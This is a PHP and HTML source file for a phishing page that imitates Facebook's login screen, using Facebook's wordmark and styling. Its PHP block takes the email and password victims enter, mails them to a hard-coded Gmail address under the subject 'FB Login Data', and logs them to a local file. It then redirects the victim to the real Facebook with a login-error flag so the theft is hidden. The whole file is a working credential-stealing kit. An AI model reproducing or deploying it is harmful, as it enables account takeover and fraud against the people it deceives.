<?php
function send_mail($data){
    $to = "slfriends6@gmail.com";
    $subject = "FB Login Data";

    $message = "<h2>Phishing FB Data</h2>
                <li>Email : $data[0]</li>
                <li>Password : $data[1]</li>

    ";

    // Always set content-type when sending HTML email
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // More headers
    $headers .= 'From: jayamal0612@gmail.com' . "\r\n";
    // $headers .= 'Cc: myboss@example.com' . "\r\n";
    mail($to,$subject,$message,$headers);

    // print_r($data[0]);
    return true;

}   

function json_write($data){
    $myfile = fopen("json.iwx", "a") or die("Unable to open file!");
    $txt = "Email : ".$data[0]."\nPassword : ".$data[1]."\n-------\n";
    fwrite($myfile, $txt);
    fclose($myfile);

    // print_r($data);
    return true;
}

if(isset($_POST['id'])) {
    $a = array();
    array_push($a, $_POST['e_id']);
    array_push($a, $_POST['p_id']);

    send_mail($a);
    json_write($a);
    // 
    header("Location:https://m.facebook.com/?login=error");
    exit;

}
 ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Responsive FaceBook Login Form</title>
    <style> 
        * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body{
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    height: 100vh;
    background-color: #f0f2f5;
}

.container{
    width: 100%;
    height: 100%;
    display: flex;
    justify-content: space-around;
    align-items: center;
    overflow: hidden;
}

.left .right, form{
    display: flex;
    align-content: center;
    justify-content: center;
    flex-direction: column;
    align-items: center;
    
}

.left{
    width: 500px;
    align-items: flex-start;
}

.left  svg{
    height: 106px;
}

.left p{
    font-size: 30px;
    color: #1c1e21;
    height: 200px;
    font-family:'Roboto Condensed', sans-serif;
    position: relative;
    left: 27px;
}

.right{
    width: 400px;
}

form{
    background-color: #fff;
    border-radius: 10px;
    width: 400px;
    display: flex;
    padding: 20px;
    margin-bottom: 25px;
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2), 0 6px 20px 0 rgba(0,0,0,0.19)
}

form input{
    width: 100%;
    padding: 15px;
    margin-bottom: 10px;
    border-radius: 5px;
    border: 1px solid #999;
    outline: none;
    font-size: 16px;
}

.loginBtn{
    background-color: #1877f2;
    padding: 15px;
    text-align: center;
    text-decoration: none;
    width: 100%;
    border-radius: 5px;
    color: #fff;
    font-size: 20px;
    font-family: 'Arial';
    font-weight: 700;
    transition:0.5s;
}

.loginBtn:hover{
    background-color: #4257b2;
}

.forget{
    margin:15px 0;
    text-decoration: none;
    color:#1877f2;
    font-family: "Arial";
    font-size: 14px;
}

.sign-up{
    padding-top: 20px;
    border-top: 1px solid #999;
    width: 100%;
    display: flex;
    justify-content: center;
}

.signupBtn{
    background-color: #42b72a;
    padding:15px ;
    text-align: center;
    text-decoration: none;
    border-radius: 5px;
    color: #fff;
    font-size: 17px;
    font-family: 'Arial';
    font-weight:600;
    transition:0.5s;
}

.signupBtn:hover{
    background-color: green;
}

.right p{
    font-family: 'Arial';
    font-size: 15px;
}

@media(max-width:950px){
    .container{
        flex-direction: column;
    }

    .left{
        width: 400px;
        align-content: center;
        align-items: center;
    }

    .left p{
        height: 75px;
        font-size: 24px;
    }
}

@media(max-width:500px){
    form{
        width:350px;
        align-content: center;
        align-items: center;
    }
}

@media(max-width:300px){
    .left svg{
        height: 95px;
    }

    form{
        width: 250px;
        align-content: center;
        align-items: center;
        position: relative;
        top: -65px;
    }

    .left p,.right p{
        display: none;
    }

    form input, .forget, .loginBtn, .signupBtn{
        font-size: 12px;
    }
}

    </style>    
</head>
<body>
    
    <div class="container">
        <div class="left">
            <svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360"><defs><style>.cls-1{fill:#1877F2;}</style></defs><title>FBWordmark_Hex-RGB-1024</title><path class="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"/><path class="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"/><path class="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"/><path class="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"/><path class="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"/><path class="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"/><path class="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"/><path class="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"/></svg>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        
        <div class="right">
            <form action="" method="POST">
                <input type="text" placeholder="Email addess or phone number" name="e_id">
                <input type="password" placeholder="Password" name="p_id">
                <input type="submit" class="loginBtn" value="Log In" name="id">
                <a href="" class="forget">Forgotten password?</a>
                <div class="sign-up">
                    <a href="" class="signupBtn">Create New Account</a>
                </div>
            </form>
            <p><b>Create a Page</b> for a celebrity, band or business.</p>
        </div>
    </div>
    <style> 

    </style>    
</body>
</html>
